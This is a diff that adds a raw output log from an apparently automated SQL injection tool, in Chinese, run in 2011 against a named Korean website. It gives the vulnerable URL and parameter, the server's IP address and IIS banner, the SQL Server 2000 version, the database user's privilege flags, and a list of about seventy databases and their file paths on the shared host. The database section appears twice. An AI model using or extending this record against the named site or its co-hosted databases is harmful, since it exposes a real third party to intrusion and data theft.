@@ -1,0 +1,144 @@
+■漏洞信息:============================================================
+ ·URL:http://www.mildair.co.kr/free/view.asp?torder=1&searchfield=&searchkey=&cpage=16&num=3289&num2=0
+ ·页面标题：≥ 浚磐抛牢刚飘傈巩 冠恩雀 咯青荤 ≥ 付老靛亲傍涝聪促.
+ ·参数:torder=1&searchfield=&searchkey=&cpage=16&num=3289&num2=0
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.239.157.37
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 11:33:51 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 42438
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDACQRRSCS=PHKDEEMDBLJMFECBPNFHEFLE; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:db024549
+ ·版本:Microsoft SQL Server  2000 - 8.00.2055 (Intel X86) 
+	Dec 16 2008 19:46:53 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 0
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:db024549
+ ·版本:Microsoft SQL Server  2000 - 8.00.2055 (Intel X86) 
+	Dec 16 2008 19:46:53 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 0
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+db001507	d:\sqldata\db001507.mdf	
+db002286	D:\SQLDATA\db002286.mdf	
+db007036	d:\sqldata\db007036.mdf	
+db008561	d:\sqldata\db008561.mdf	
+db010650	e:\sqldata\db010650.mdf	
+db011466	d:\sqldata\db011466.mdf	
+db015093	e:\sqldata\db015093.mdf	
+db015373	d:\sqldata\db015373.mdf	
+db015811	e:\sqldata\db015811.mdf	
+db017077	d:\sqldata\db017077.mdf	
+db018920	e:\sqldata\db018920.mdf	
+db018958	e:\sqldata\db018958.mdf	
+db020172	d:\sqldata\db020172.mdf	
+db020299	d:\sqldata\db020299.mdf	
+db021934	d:\sqldata\db021934.mdf	
+db022228	e:\sqldata\db022228.mdf	
+db022284	e:\sqldata\db022284.mdf	
+db023129	d:\sqldata\db023129.mdf	
+db023199	d:\sqldata\db023199.mdf	
+db023210	d:\sqldata\db023210.mdf	
+db023281	d:\sqldata\db023281.mdf	
+db023299	d:\sqldata\db023299.mdf	
+db023406	d:\sqldata\db023406.mdf	
+db023598	e:\sqldata\db023598.mdf	
+db023609	d:\sqldata\db023609.mdf	
+db023661	d:\sqldata\db023661.mdf	
+db023744	d:\sqldata\db023744.mdf	
+db023757	d:\sqldata\db023757.mdf	
+db023850	d:\sqldata\db023850.mdf	
+db023932	d:\sqldata\db023932.mdf	
+db023962	d:\sqldata\db023962.mdf	
+db024038	d:\sqldata\db024038.mdf	
+db024087	d:\sqldata\db024087.mdf	
+db024089	d:\sqldata\db024089.mdf	
+db024175	d:\sqldata\db024175.mdf	
+db024245	d:\sqldata\db024245.mdf	
+db024282	d:\sqldata\db024282.mdf	
+db024286	d:\sqldata\db024286.mdf	
+db024322	d:\sqldata\db024322.mdf	
+db024409	d:\sqldata\db024409.mdf	
+db024427	d:\sqldata\db024427.mdf	
+db024430	d:\sqldata\db024430.mdf	
+db024549	d:\sqldata\db024549.mdf	
+db024606	d:\sqldata\db024606.mdf	
+db024609	d:\sqldata\db024609.mdf	
+db024629	d:\sqldata\db024629.mdf	
+db024646	d:\sqldata\db024646.mdf	
+db024697	d:\sqldata\db024697.mdf	
+db024708	d:\sqldata\db024708.mdf	
+db024797	e:\sqldata\db024797.mdf	
+db024829	e:\sqldata\db024829.mdf	
+db024835	e:\sqldata\db024835.mdf	
+db024897	e:\sqldata\db024897.mdf	
+db024911	e:\sqldata\db024911.mdf	
+db024912	e:\sqldata\db024912.mdf	
+db025026	e:\sqldata\db025026.mdf	
+db025177	e:\sqldata\db025177.mdf	
+db025228	e:\sqldata\db025228.mdf	
+db025248	e:\sqldata\db025248.mdf	
+db025319	e:\sqldata\db025319.mdf	
+db025337	e:\sqldata\db025337.mdf	
+db025366	e:\sqldata\db025366.mdf	
+db025369	e:\sqldata\db025369.mdf	
+db025423	e:\sqldata\db025423.mdf	
+db025442	e:\sqldata\db025442.mdf	
+db025507	e:\sqldata\db025507.mdf	
+db025545	E:\SQLDATA\db025545.mdf	
+db025606	e:\sqldata\db025606.mdf	
+db025627	e:\sqldata\db025627.mdf	
+db025728	e:\sqldata\db025728.mdf	
